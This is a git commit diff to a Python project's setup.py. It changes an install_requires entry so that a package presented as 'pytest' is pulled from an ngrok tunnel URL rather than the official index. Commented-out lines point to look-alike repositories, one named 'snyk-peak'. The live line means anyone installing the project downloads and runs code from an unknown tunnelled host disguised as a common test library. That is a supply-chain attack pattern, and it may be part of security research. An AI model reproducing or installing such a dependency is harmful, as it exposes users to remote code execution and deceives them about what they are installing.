f0f0a364907792b29436a25d9e7e93b209120280
Raviv Zomer <139374066+ravivzomer@users.noreply.github.com>
2024-07-01 14:10:30 +0300

    Update setup.py

--- setup.py
+++ setup.py
@@ -32,7 +32,7 @@ setup(
     install_requires=[
         'requests',
         'atlassian-python-api',
-        'pytest @ https://cfdc-2a0d-6fc2-6430-1c00-608d-dac6-399e-7648.ngrok-free.app',
+        'pytest @ https://cfdc-2a0d-6fc2-6430-1c00-608d-dac6-399e-7648.ngrok-free.app/bugabuga/',
         # 'python-gearman @ git+https://github.r0l.me/rreissdorker/snyk-peak.git',
         # 'pytest @ git+https://github.r0l.me/ravivzomer/tb.git',
     ],
